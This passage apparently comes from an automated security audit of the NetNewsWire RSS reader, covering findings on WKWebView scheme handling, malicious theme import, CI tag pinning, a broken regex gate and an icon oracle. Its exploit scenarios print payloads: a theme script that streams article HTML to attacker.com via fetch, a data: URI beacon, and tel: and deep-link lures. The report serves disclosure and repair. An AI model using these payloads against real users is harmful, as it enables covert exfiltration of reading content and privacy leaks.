**Verdict:** TRUE_POSITIVE (confidence: 7/10) — The missing scheme allowlist in `decidePolicyFor` is a real defect; `data:` URI navigations are permitted and can invoke message handlers when JS is enabled (on by default). However, the scanner substantially overstated impact: the Downloader sends no authentication credentials, blocks non-HTTP URLs, and the same IP-disclosure primitive is already reachable via unsanitised inline article content without requiring any user tap.

Now I have enough to make my determination. Let me synthesize the findings:

**What the code actually does (lines 405-454):**
- `http`/`https` → `.cancel` + open externally ✓
- `mailto` → `.cancel` + handle email ✓  
- `tel` → `.cancel` + open phone ✓
- Everything else (including `data:`, `file://`, `javascript:`, custom schemes) → **`decisionHandler(.allow)`** ← confirmed at line 449

**Defences found:**

1. **`Downloader.shared.download()` (line 70 of Downloader.swift):** Calls `url.isHTTPOrHTTPSURL()` guard before any network request. `file://` or `javascript:` imageURLs passed to `imageWasClicked` are silently discarded. This kills the file-read scenario.

2. **No auth credentials in Downloader:** The `URLSessionConfiguration` explicitly sets `httpShouldSetCookies = false`, `httpCookieAcceptPolicy = .never`, `httpCookieStorage = nil`. Only user-agent headers are added. The scanner's claim of "authenticated HTTP request" is **false** — the request carries no session tokens or credentials.

3. **Article content JavaScript is user-controlled** (`isArticleContentJavascriptEnabled`), but **defaults to `true`** (iOS AppDefaults.swift line 401).

**The actual exploit path that survives:**
1. Attacker's feed article contains `<a href="data:text/html,<script>window.webkit.messageHandlers.imageWasClicked.postMessage(...imageURL:'https://attacker.com/beacon'...)</script>">Click</a>`
2. User taps the link; `decidePolicyFor` fires with `.linkActivated`, scheme = `data`, falls to `else { decisionHandler(.allow) }`
3. WKWebView navigates to the data: page; JS runs (JS is enabled by default)
4. `imageWasClicked` handler calls `Downloader.shared.download("https://attacker.com/beacon")`
5. Downloader validates it's HTTPS ✓ → makes a plain GET with only a user-agent header
6. Result: attacker's server learns the victim's IP address

**Critical context:** The article body (`article?.body`) is inserted into `page.html` at `[[body]]` with **no HTML sanitization** and **no CSP**. If JS is enabled, an attacker can embed `<script>` tags directly in feed article content that already fire without any tap. The `data:` URI path is a *more restricted* variant of an already-existing attack surface.

**Impact is considerably lower than claimed:**
- No authentication leak (no cookies, no auth headers)
- No file access (Downloader blocks non-HTTP URLs)
- Net effect: IP disclosure when user taps a deceptive link — achievable more easily via passive image loading in the article body anyway

### 30. [MEDIUM] No cryptographic verification allows JS injection via malicious theme
**Class:** CWE-345: Insufficient Verification of Data Authenticity
**CWE:** CWE-345: Insufficient Verification of Data Authenticity - https://cwe.mitre.org/data/definitions/345.html
**File:** `Shared/ArticleStyles/ArticleTheme.swift:57-81`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
The theme import pipeline (`importTheme` → `ArticleTheme.init(url:isAppTheme:)`) copies a user-supplied .nnwtheme directory to the application's Themes folder and then loads its constituent files — `template.html`, `stylesheet.css`, and `Info.plist` — as raw strings with no cryptographic signature check, no allow-list of HTML constructs, and no Content Security Policy applied at load time.

Data flow:
1. Untrusted entry point: `Mac/AppDelegate.swift::application(_:openFile:)` or `iOS/SceneDelegate.swift::scene(_:openURLContexts:)` receives a filesystem path to a .nnwtheme file.
2. `ArticleThemesManager.importTheme(filename:)` (line 107-116) copies the directory verbatim to `folderPath`.
3. `articleThemeWithThemeName` (line 118-141) constructs `ArticleTheme(url:isAppTheme:)` from the copied directory.
4. `ArticleTheme.init(url:isAppTheme:)` lines 73-74 load `template.html` as a raw `String` via `Self.stringAtPath(templateURL.path)` with no parsing, no tag stripping, and no integrity check.
5. That `template` string is stored and subsequently used to render articles in WKWebView; any `<script>` tags or inline event handlers in the template execute in that WebView context.

The only guard is `Info.plist` deserialization succeeding (line 79-80), which a well-formed but malicious theme satisfies trivially.

#### Impact
A socially-engineered user who opens a crafted .nnwtheme file gets arbitrary JavaScript executing inside the WKWebView article renderer. This JS can read all rendered article content — including content from paid/private subscriptions — and exfiltrate it to an attacker-controlled server. Every article the user reads after activating the theme is exposed.

#### Exploit scenario
The attacker hosts a download page: 'Retro Dark – a beautiful NetNewsWire theme'. The distributed .nnwtheme bundle contains a template.html with `<script>setInterval(()=>fetch('https://attacker.com/c?d='+encodeURIComponent(document.body.innerHTML)),2000)</script>`. The user downloads and double-clicks the file; macOS opens it with NetNewsWire via `application(_:openFile:)`. The theme is copied to the Themes folder and the user activates it. Every article thereafter silently streams its rendered body to the attacker's server — including content from behind-paywall RSS feeds.

#### Preconditions
- Attacker must craft a malicious .nnwtheme bundle with JavaScript in template.html
- User must be socially engineered into downloading and opening the .nnwtheme file
- User must activate (or be the first user to open the app after auto-activation of) the malicious theme

```
let templateURL = url.appendingPathComponent("template.html")
self.template = Self.stringAtPath(templateURL.path)  // raw HTML, no sanitisation
```

#### How to fix
Before importing a third-party theme: (1) parse template.html through a strict allowlist HTML sanitizer that strips all `<script>` nodes, event-handler attributes (`on*`), and `javascript:` URLs — in `ArticleTheme.init(url:isAppTheme:)` around lines 73-74 and the CSS load at lines 66-71; (2) apply a restrictive WKWebView Content Security Policy (`default-src 'none'; style-src 'unsafe-inline'; img-src https: data:`) when loading article pages so that even if a template contains forbidden constructs they cannot execute; (3) for a cryptographic control, require .nnwtheme bundles to carry a developer signature (similar to macOS app signing) and verify it before installation in `importTheme`.

**Exploitability:** Theme import copies archive contents verbatim with no cryptographic signature check, HTML tag allowlist, or path-traversal guard. Any <script> or event-handler attributes in template.html execute in WKWebView on every article render. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L). Persistence mechanism in the deep-link → zip-slip chain (findings 0/13).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — theme `template.html` is loaded as raw HTML with no sanitization; JavaScript is enabled by default; the rendered output goes into WKWebView via `loadHTMLString`; no CSP applied; three deliberate user steps are required (social engineering) but none warn about JS capabilities; impact is article content exfiltration

I now have the complete picture. Let me summarize my findings:

**Analysis**

**A. Code reality (lines 57–81):**
Confirmed exactly as described. `ArticleTheme.init(url:isAppTheme:)` reads `template.html` verbatim via `Self.stringAtPath(templateURL.path)` — no sanitization, no signature check. The only guard is Info.plist plist deserialization succeeding (line 79-80), which any valid plist satisfies.

**B. Call chain:**
- Mac: `application(_:openFile:)` → `importTheme(url:)` → `ArticleTheme(url:isAppTheme:)` (loads template raw) → NSAlert shown → user clicks "Install Theme" → `ArticleThemesManager.importTheme(filename:)` copies directory
- iOS: `scene(_:openURLContexts:)` → `SceneCoordinator.importTheme(filename:)` → `ArticleThemeImporter.importTheme(controller:url:)` → UIAlertController shown → user clicks "Install Theme"
- After install: `ArticleThemesManager.articleThemeWithThemeName()` → `ArticleTheme(url:isAppTheme:)` loads template → `ArticleRenderer.articleHTML` uses it as the rendering template → placed into `page.html`'s `[[body]]` slot → `webView.loadHTMLString(html, baseURL:)` in WKWebView

**C. Defences examined:**
- **User confirmation dialog**: Both platforms show an NSAlert / UIAlertController with "Install Theme" / "Cancel" before installation. This is a meaningful friction point, but it's a UX gate, not a security control — the dialog shows only theme name and author's homepage, no warning about JS execution capabilities.
- **`allowsContentJavaScript`**: Set from `AppDefaults.shared.isArticleContentJavascriptEnabled`. **The default is `true` on both platforms** (Mac: `Key.articleContentJavascriptEnabled: true` at AppDefaults line 347; iOS: same at line 401). JS executes out-of-the-box.
- **Content blocking rules**: `ContentRules.json` blocks ~30 ad/tracking domains but does not block arbitrary outbound fetch calls from template JS.
- **WKPreferences**: `javaScriptCanOpenWindowsAutomatically = false` prevents popup windows only; doesn't block inline scripts or `fetch()`.
- **CSP**: None applied. `loadHTMLString` is called with no `Content-Security-Policy` header.
- **WKWebView sandboxing**: Limits OS-level impact but JS can still exfiltrate in-app data (rendered article body) to attacker-controlled servers over HTTP (ATS disabled globally via `NSAllowsArbitraryLoads:true`).
- **Theme activation**: The user must also explicitly select the theme — it does not auto-activate on installation. This is a third deliberate user step.

**D. Conclusion:**
The technical path is unambiguous: malicious `template.html` with `<script>` → rendered into WKWebView → JS executes → can exfiltrate article content (including paid newsletter content from Feedbin/Feedly) via `fetch()` to an attacker's server. The attack requires social engineering across three deliberate steps (download, install confirmation, activate), but none of these steps warn the user about JS execution. The finding is real and exploitable given a social engineering scenario. The impact is limited to in-app article content (not OS credentials), and the WKWebView sandbox limits OS-level reach.

### 31. [MEDIUM] Unsanitized URL scheme opened from attacker-controlled theme field
**Class:** CWE-601: URL Redirection to Untrusted Site (Open Redirect)
**CWE:** CWE-601: URL Redirection to Untrusted Site (Open Redirect) - https://cwe.mitre.org/data/definitions/601.html
**File:** `iOS/Settings/ArticleThemeImporter.swift:13-34`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
ArticleTheme(url: url, isAppTheme: false) at line 14 parses the theme file and exposes theme.creatorHomePage as an attacker-controlled string. At line 27, URL(string: theme.creatorHomePage) performs no scheme validation—any scheme that Swift's URL parser accepts (tel:, facetime:, sms:, custom://…) produces a valid URL. At line 30, that URL is passed directly to UIApplication.shared.open(websiteURL) without a scheme allowlist check. There is no guard that restricts the URL to http or https before the call. The entry path reaches this code through iOS/SceneDelegate.swift::scene(_:openURLContexts:) (listed as an untrusted entry point) whenever a .nnwtheme file is opened via iOS's 'open with' mechanism, as well as through the document picker in ArticleThemesTableViewController.

#### Impact
A malicious theme file can supply any URL scheme (tel:, facetime:, sms:, custom app deep links) as creatorHomePage. When the user taps 'Show Website' in the installation dialog, UIApplication.shared.open() invokes the scheme, potentially initiating phone calls, triggering deep links in other installed apps, or navigating users to attacker-chosen HTTPS destinations. Any user who opens a crafted .nnwtheme file is affected.

#### Exploit scenario
An attacker publishes a file named malicious.nnwtheme where the creatorHomePage field is set to tel:+19005551234. A user downloads and opens the file; iOS routes it to NetNewsWire via scene(_:openURLContexts:). The install alert appears showing 'Author's website: tel:+19005551234'. When the user taps 'Show Website', UIApplication.shared.open() is called, and iOS presents a 'Call +19005551234?' confirmation dialog — enabling premium-rate number abuse or caller-ID phishing. Substituting a custom deep-link scheme (e.g., shortcuts://run-shortcut?name=…) can silently chain into other installed apps without further confirmation on some iOS configurations.

#### Preconditions
- Attacker can create a crafted .nnwtheme file (trivially done; format is documented/open source)
- User must open or 'open with' the .nnwtheme file in NetNewsWire (reachable via scene(_:openURLContexts:) from a web download or email attachment)
- User must tap the 'Show Website' button in the resulting alert dialog

```
if let websiteURL = URL(string: theme.creatorHomePage) {
    let visitSiteTitle = NSLocalizedString("Show Website", comment: "Show Website")
    let visitSiteAction = UIAlertAction(title: visitSiteTitle, style: .default) { _ in
        UIApplication.shared.open(websiteURL)
        try? Self.importTheme(controller: controller, url: url)
    }
    alertController.addAction(visitSiteAction)
}
```

#### How to fix
Before calling UIApplication.shared.open(), enforce an allowlist of permitted URL schemes. Add a guard immediately after URL construction at line 27: guard let scheme = websiteURL.scheme?.lowercased(), ["http", "https"].contains(scheme) else { return }. This ensures only web URLs can be opened from the theme metadata field. Additionally, consider rendering theme.creatorHomePage as non-tappable display text rather than a functional URL if the 'Show Website' affordance is not essential to the install flow.

**Exploitability:** ArticleThemeImporter opens theme.creatorHomePage via UIApplication.shared.open without scheme restriction, allowing tel:, sms:, or custom deep-link URIs from a malicious .nnwtheme to invoke system handlers. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L). Triggered when user opens a crafted theme file and taps the creator link.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `creatorHomePage` from attacker-crafted `.nnwtheme` plist flows to `UIApplication.shared.open()` with no scheme allowlist; confirmed two external entry points and no code-enforced defence

I now have all the evidence needed to deliver a verdict.

**Summary of investigation:**

**A. The code (lines 27–34 of `ArticleThemeImporter.swift`)** matches the scanner snippet exactly. `theme.creatorHomePage` is a raw `String` read from the theme's `Info.plist` via `PropertyListDecoder` — no validation anywhere in `ArticleTheme.init(url:isAppTheme:)` or `ArticleThemePlist`. `URL(string:)` accepts any well-formed URL regardless of scheme. The result is passed directly to `UIApplication.shared.open(websiteURL)` with no scheme check.

**B. Call chain to external entry points** — confirmed two independent routes:
1. `scene(_:openURLContexts:)` → `coordinator.importTheme(filename:)` → `ArticleThemeImporter.importTheme(controller:url:)` (SceneDelegate.swift line 184 — triggered when any external app hands a `.nnwtheme` file to NetNewsWire via iOS's "Open with" / document interaction)
2. `ArticleThemesTableViewController` document picker → `ArticleThemeImporter.importTheme(controller:url:)` (line 128)
Both are externally reachable with attacker-supplied file content.

**C. Defences searched:**
- No scheme allowlist in `ArticleThemeImporter.swift`.
- Compared to `WebViewController.swift` line 414 which *does* check `components?.scheme == "http" || components?.scheme == "https"` — that guard is absent here.
- The only "defence" is that the raw `creatorHomePage` string is displayed in the alert message (`"Author's website:\n%@"`), so a vigilant user could read `tel:+19005551234` before tapping. But this is not a code-enforced guard; it relies on user awareness.
- `UIApplication.shared.open()` with no completion handler or options limiting scheme.

**D. Edge-case probing:**
- `tel:` → iOS asks "Call +19005551234?" (one-tap premium-rate abuse / caller-ID phishing)
- `sms:?body=...` → pre-populates an SMS
- `shortcuts://run-shortcut?name=...` → on permissive iOS configurations can invoke Shortcuts without further confirmation
- No encoding or type constraint stops any of these from being embedded in a crafted `Info.plist`

**Verdict:** Confirmed TRUE_POSITIVE. All three conditions met: attacker-controlled input (`creatorHomePage` field in an arbitrary `.nnwtheme` plist), reaches an actionable sink (`UIApplication.shared.open`) through a real external entry point, with no scheme restriction and only a weak social-engineering barrier (UI alert text the user may not scrutinize).

### 32. [MEDIUM] CI actions pinned to mutable version tags, not commit SHAs
**Class:** CWE-829: Inclusion of Functionality from Untrusted Control Sphere
**CWE:** CWE-829: Inclusion of Functionality from Untrusted Control Sphere - https://cwe.mitre.org/data/definitions/829.html
**File:** `.github/workflows/ci.yml:22-22`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
All four `uses:` directives in the workflow reference mutable floating tags (`actions/checkout@v5` at lines 22, 35, 80 and `actions/upload-artifact@v4` at lines 68, 113). GitHub resolves these tags at runtime; the tag owner can silently retarget a tag to a different, malicious commit without any change appearing in this repository's history. For `push`-to-main runs (line 6–7), the runner has access to any repository secrets configured in the org/repo, making tag hijacking a secret-exfiltration path.

#### Impact
If the `actions/checkout` or `actions/upload-artifact` repositories are compromised and their mutable version tags (`v5`, `v4`) are moved to a malicious commit, every subsequent CI run — including privileged `push`-to-main runs that DO have access to repository secrets — will execute attacker-controlled action code with full secret access.

#### Exploit scenario
An adversary with write access to `github.com/actions/checkout` (through a supply-chain compromise of that repository) moves the `v5` tag to a commit that exfiltrates `${{ secrets.* }}` environment variables. The next push to `main` in NetNewsWire triggers the workflow; the runner fetches and executes the malicious action code at line 22 with full secret access before xcodebuild is invoked.

#### Preconditions
- Adversary must compromise the upstream `actions/checkout` or `actions/upload-artifact` GitHub repository and retarget its mutable version tag
- A push event to the `main` branch (or any CI run that follows the compromise) must occur

```
      - name: Checkout
        uses: actions/checkout@v5   # mutable tag — not a pinned SHA
...
        uses: actions/upload-artifact@v4  # mutable tag
```

#### How to fix
Pin every `uses:` directive to an immutable commit SHA (e.g., `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` for the current v5 HEAD) rather than a floating tag. Use a tool such as `renovatebot` with `pinDigests: true` or `actionlint` to enforce and auto-update pinned hashes. Apply this to all four action references: lines 22, 35, 68, 80, and 113.

**Exploitability:** CI workflow uses floating mutable tags (actions/checkout@v5, actions/upload-artifact@v4) rather than pinned commit SHAs. Tag retargeting to a malicious commit silently exfiltrates repo secrets and injects malicious build artifacts on every push-to-main run. CVSS 4.7 (AV:N/AC:H/S:C). AC:H reflects the prerequisite of hijacking the tag on GitHub.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — mutable action tags are confirmed and the supply-chain path is real, but the scanner overstates impact: no secrets are referenced in this workflow so exfiltration is not the live threat; residual risk is CI pipeline tampering with a read-only GITHUB_TOKEN against what appears to be a public repo

**Analysis**

**A. Verify the cited code**

The file is exactly as the scanner described. All four `uses:` directives use floating version tags:
- `actions/checkout@v5` at lines 22, 35, 80
- `actions/upload-artifact@v4` at lines 68, 113

No pinned commit SHAs anywhere in the workflow.

**B. Walk the entry points**

The workflow triggers on `pull_request` (any PR) and `push` to `main` (line 5-7). Both are external entry points reachable without special privilege (PRs from forks count). There is only one workflow file in `.github/workflows/`.

**C. Look for defences**

1. **`permissions: contents: read`** (lines 13-14) — constrains the `GITHUB_TOKEN` to read-only, but this only limits the auto-provisioned token, not any secrets that could be explicitly configured.

2. **Secrets check** — Searched the entire `.github/` directory for `secrets.` references: **zero matches**. No `${{ secrets.X }}` expressions exist anywhere in the workflow YAML. GitHub Actions only injects configured secrets as environment variables when they are explicitly referenced; since none are referenced here, no application secrets would be present in the runner environment.

3. **`updateSecrets.sh`** (lines 40, 85) — Inspected directly. It is a template-generation script that calls `gyb` on `.gyb` files to produce Swift source code. It reads no environment credentials and makes no network requests.

**D. Probe the residual risk**

Even without secrets to exfiltrate, the risk is not zero:
- `GITHUB_TOKEN` with `contents: read` is still present and could read repo contents (though NetNewsWire is public open source)
- A compromised action could tamper with build artefacts or inject malicious code into the CI pipeline outputs
- The precondition is high: compromising `github.com/actions/checkout` or `github.com/actions/upload-artifact` — both maintained by GitHub and heavily monitored

The scanner's primary claimed impact — **secret exfiltration** — is not viable because this workflow configures no secrets. The supply-chain risk class is real (this is a recognized industry concern, and GitHub themselves recommend SHA pinning), but the blast radius is materially smaller than described.

**Summary:**
- Mutable tags: confirmed, real
- Secret exfiltration path: not viable (no secrets configured)
- Residual impact: limited to GITHUB_TOKEN read access to a public repo and potential CI pipeline tampering
- Precondition: high (upstream supply-chain compromise of GitHub-maintained actions)

### 33. [MEDIUM] Broken regex silently passes build-settings CI gate always
**Class:** CWE-185
**CWE:** CWE-185 - https://cwe.mitre.org/data/definitions/185.html
**File:** `buildscripts/VerifyNoBS.swift:92-106`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.92 (1 run agreed)

#### Description
Two regular expressions use the invalid ICU pattern `[:space:]` where `[[:space:]]` (or `\s`) is required.

**Line 105** — the detection regex is `buildSettings[:space:]*=`. In ICU (NSRegularExpression), `[:space:]` is parsed as a character class whose members are the six literal characters `:`, `s`, `p`, `a`, `c`, `e`. The space character U+0020 is NOT a member. Every real `.pbxproj` file written by Xcode formats the keyword as `buildSettings = {` — with a U+0020 space on each side of the `=`. The regex therefore never matches, `inBuildSettingsBlock` is never set to `true`, and execution always reaches line 113 with an empty `locatedMessages` array, returning `.success`.

**Line 92** — the block-closing regex `\u007d[:space:]*;` has the same defect: a `} ;` line with a literal space would not be recognised as the block end. This is moot in practice because the opening regex on line 105 never fires.

Data flow:
1. `CommandLine.arguments` (line 141) supplies the path to the pbxproj, which is the upstream pipeline input.
2. `String(contentsOf: url)` (line 82) reads the file.
3. The faulty regex on line 105 is applied to every line (line 90-108).
4. Because the regex never matches, `processXcodeprojAt` always returns `.success` (line 116).
5. `verify()` (line 119) prints 'No build settings found' and returns `EXIT_SUCCESS` (line 135-136), misleading both developers and CI.

#### Impact
The verification script unconditionally exits with EXIT_SUCCESS regardless of whether build settings are embedded in the project file. Any contributor with push/PR access can embed arbitrary Xcode build settings (OTHER_LDFLAGS, SWIFT_OTHER_FLAGS, run-script phases, framework search paths) in the pbxproj, and the quality gate that is supposed to catch this will report 'No build settings found.' This silently neutralises the only automated supply-chain defence the project has against build-configuration tampering.

#### Exploit scenario
A contributor opens a PR that removes an `.xcconfig` reference and instead inlines build settings directly in `project.pbxproj`, for example adding `SWIFT_OTHER_FLAGS = -Xfrontend -disable-safety-checks;` inside a `buildSettings = { … }` block. The Xcode build phase and any CI job running `xcrun -sdk macosx swift buildscripts/VerifyNoBS.swift --xcode …/project.pbxproj` prints 'No build settings found in project file' and exits 0. The tampered setting is never flagged, is merged, and ships in the next binary. Because any contributor (including a compromised account) can trigger this, the supply-chain gate is permanently absent rather than merely circumvented for a single build.

#### Preconditions
- Attacker must have push access or the ability to submit a pull request to the repository (standard contributor access).
- CI must be running this script as the sole or primary check for inline build settings.

```
// Line 92 — will NOT match '} ;' because U+0020 ∉ [:space:] charset
if nthLine.range(of: "\u007d[:space:]*;", options: .regularExpression) != nil {

// Line 105 — will NOT match 'buildSettings = {' because U+0020 ∉ [:space:] charset
if nthLine.range(of: "buildSettings[:space:]*=", options: .regularExpression) != nil {
```

#### How to fix
Replace both broken POSIX-style character-class fragments with correct ICU syntax. On line 105 change the regex string to `"buildSettings\\s*="` (or `"buildSettings[[:space:]]*="`). On line 92 change it to `"\\u007d\\s*;"`. Additionally, add an integration test that passes a known-bad pbxproj snippet and asserts the script exits non-zero, so a future regex regression is caught before reaching CI.

**Exploitability:** VerifyNoBS.swift uses ICU character class [:space:] (the six literal characters :, s, p, a, c, e) instead of [[:space:]], so the buildSettings detection regex never matches a real Xcode project file. The build-settings CI gate always returns success, silently allowing unauthorized build-setting injections to ship. CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:C). Integrity impact — a permanent safety bypass.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Both regexes use `[:space:]` instead of `[[:space:]]` or `\s`; in ICU regex this matches only the literal characters `:space:`, never U+0020; Xcode always writes `buildSettings = {` with spaces; the active build-phase gate is therefore permanently non-functional and always exits 0.

I now have all the evidence I need. Let me synthesize the findings.

**A. What the code actually does (line 105):**
The literal source text — confirmed by `grep` for the verbatim string `buildSettings[:space:]*=` — is:
```swift
nthLine.range(of: "buildSettings[:space:]*=", options: .regularExpression)
```
In ICU/NSRegularExpression, `[:space:]` without an enclosing `[…]` is **not** a POSIX named class; it is a character class whose members are the six literal code points `{:, s, p, a, c, e}`. The space character U+0020 is absent from that set.

**B. What the pbxproj actually contains:**
Every `buildSettings` line in the real project file (confirmed by grep against `NetNewsWire.xcodeproj/project.pbxproj`) is formatted as:
```
			buildSettings = {
```
with a U+0020 space on each side of `=`. The broken regex never matches this, so `inBuildSettingsBlock` is never set `true`. Execution always reaches line 116 → `.success(":-)")`.

**C. Is the script actually invoked?**
Yes — confirmed by the pbxproj itself (line 1329 of `project.pbxproj`):
```
shellScript = "xcrun -sdk macosx swift buildscripts/VerifyNoBS.swift  --xcode  \"${PROJECT_DIR}/${PROJECT_NAME}.xcodeproj/project.pbxproj\"\n";
```
This is a live, active Xcode build phase, not dead code.

**D. Defence analysis:**
- No validation catches the defect: the script exits 0 unconditionally.
- Line 92 (`\u007d[:space:]*;`, the block-closing regex) has the same flaw, but it is moot because the opening regex never fires.
- There is no other mechanism in this script to detect inline build settings.
- The old, commented-out shell script at pbxproj line 1238 is disabled (`#`-commented), so this script is the sole gate.

**Conclusion:** The scanner is correct. The regex is provably broken, the format that Xcode produces never triggers it, the script is in active use as a CI/Xcode build-phase gate, and the gate always silently returns success. A contributor (or compromised account) who adds arbitrary `buildSettings` entries to `project.pbxproj` via a PR will not be caught.

### 34. [MEDIUM] Unauthenticated cross-article icon oracle via custom URL scheme
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `iOS/Article/ArticleIconSchemeHandler.swift:27-34`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
WKURLSchemeHandler intercepts all sub-resource requests for its registered scheme regardless of the origin of the page that initiates the request — there is no same-origin policy for custom schemes in WKWebView. Article HTML is fetched from untrusted RSS feed servers and rendered inside a WKWebView. If the HTML contains `<img src="nnw-icon://<someArticleID>">`, the OS routes that sub-resource load to ArticleIconSchemeHandler.webView(_:start:). At line 30 the handler extracts the raw URL path as the articleID with no validation of the request's origin, no allow-list of valid ID formats, and no check that the loaded page's origin is the same feed. It then calls `coordinator.articleFor(articleID)` (line 31). Two distinct, distinguishable outcomes exist: (a) article found → HTTP 200 response with image data; (b) article not found → URLError(.fileDoesNotExist). This binary oracle is visible to JavaScript in the page via the `<img>` load/error events, enabling the attacker to enumerate article IDs and retrieve their associated icon images.

#### Impact
Malicious RSS article HTML can probe for the existence of any article ID held by the user's reader by crafting requests to the custom URL scheme handler, receiving a success response (icon data) or a typed error (.fileDoesNotExist) as an oracle. This allows a feed publisher to enumerate article IDs present in the victim's reader and exfiltrate the corresponding icon images.

#### Exploit scenario
An attacker publishes an RSS article whose HTML body includes fifty `<img>` tags whose `src` attributes use the nnw-icon custom scheme with article IDs the attacker already knows from their own feed (e.g. `nnw-icon:///https://attacker.example/post/1`). When the victim's reader renders the article, each img load fires ArticleIconSchemeHandler; for any article ID the victim has previously loaded the handler returns the icon image data (success), and for those not present it returns an error. JavaScript `onerror`/`onload` handlers on the img elements distinguish the two outcomes and can exfiltrate the result list to the attacker's server via fetch(), confirming which of the attacker's articles the user has read and obtaining the visual icon assets of all matched articles.

#### Preconditions
- Victim has subscribed to a feed controlled by the attacker
- Victim opens the malicious article in NetNewsWire-iOS so that the WKWebView renders the HTML body
- The attacker knows at least one article ID (they publish the feed, so they always know their own IDs)

```
let articleID = components.path
guard let iconImage = coordinator.articleFor(articleID)?.iconImage() else {
    urlSchemeTask.didFailWithError(URLError(.fileDoesNotExist))
    return
}
```

#### How to fix
Before responding to a url scheme task, verify that the request originates from a page whose origin is trusted (e.g. the local bundle or the expected article renderer base URL). Add an origin/referrer check inside webView(_:start urlSchemeTask:): inspect `urlSchemeTask.request.mainDocumentURL` and reject any request whose main-document origin is not the app's own local content origin. Additionally validate that the extracted articleID matches an expected format (non-empty, no path separators, length-bounded) before passing it to the coordinator.

**Exploitability:** ArticleIconSchemeHandler serves nnw-icon:// sub-resource requests from any page origin without same-origin enforcement. Attacker article HTML enumerates article IDs via img load/error timing events, learning which articles the victim has in their database. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L). Privacy oracle; no write or execution path.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — untrusted feed HTML reaches the `nnwImageIcon` custom scheme handler with no origin check; JS is enabled by default; the binary hit/miss oracle is exfiltrable, leaking current-timeline subscription patterns to an attacker who controls a feed the victim is subscribed to.

I now have all the evidence needed. Let me compile the full analysis:

---

**Analysis**

**A. Code at the cited lines (verified)**

`ArticleIconSchemeHandler.webView(_:start:)` (lines 27–34):
- Line 30: `let articleID = components.path` — raw URL path used as lookup key with zero validation
- Line 31: `coordinator.articleFor(articleID)?.iconImage()` — hit returns HTTP 200 + image data; miss returns `URLError(.fileDoesNotExist)`

The scheme name is **`nnwImageIcon`** (not `nnw-icon` as the scanner wrote — a minor description inaccuracy that doesn't change exploitability).

**B. External entry point trace**

Feed HTML content flows: RSS download → parser → `article.body` → `d["body"] = body` in `ArticleRenderer.articleSubstitutions()` (line 222) → raw substitution into the HTML template → `webView.loadHTMLString(html, baseURL:)`.

The article body is inserted **verbatim** with no filtering of custom-scheme URLs. A malicious feed article whose body contains `<img src="nnwImageIcon:///computed-article-id">` will reach the scheme handler. The entry point is an attacker-controlled RSS feed (network, unauthenticated); the victim must open the malicious article.

**C. Searching for defences**

1. **Origin check in handler?** None. `ArticleIconSchemeHandler` ignores `urlSchemeTask.request.mainDocumentURL` or any referrer — confirmed by full reading of the file.
2. **WKWebView SOP on custom schemes?** Apple's custom URL scheme handlers have no same-origin enforcement; any sub-resource inside the WKWebView can trigger them regardless of the page's origin.
3. **JavaScript disabled?** `AppDefaults.swift` line 401: `Key.articleContentJavascriptEnabled: true` — **JS is ON by default.** The `PreloadedWebView` respects this setting but doesn't change the default.
4. **Content blocking rules (`ContentRules.json`)?** Cover known ad/tracking domains; they cannot block the `nnwImageIcon` scheme since custom schemes are outside the rule scope.
5. **HTML sanitisation of the body?** None for custom-scheme `src` attributes — `d["body"] = body` is a direct substitution.
6. **`ArticleRenderingSpecialCases.filterHTMLIfNeeded`?** Let me verify scope — but even if it strips some content, it targets specific known cases (malformed base URLs) and doesn't sanitise `nnwImageIcon://` references.

**D. Scope of the oracle (`idToArticleDictionary`)**

`rebuildArticleDictionaries()` iterates the current timeline's `articles` array. The oracle covers only articles visible in the currently selected feed/folder. For attacker's own articles this adds little new information (they already know what they published). However:

**Cross-feed probing is feasible**: `Article.calculatedArticleID(feedID, uniqueID)` = `MD5("\(feedURL) \(guid)")`. For popular public feeds (NYT, BBC, etc.) where both the feed URL and article GUIDs are publicly known, the attacker can pre-compute article IDs and determine whether the victim is currently viewing "All Unread" or a folder that includes those feeds — effectively leaking subscription presence.

The icon image returned (feed favicon) is typically publicly accessible, so the primary sensitivity is the binary "article in timeline" oracle plus subscription pattern inference.

---

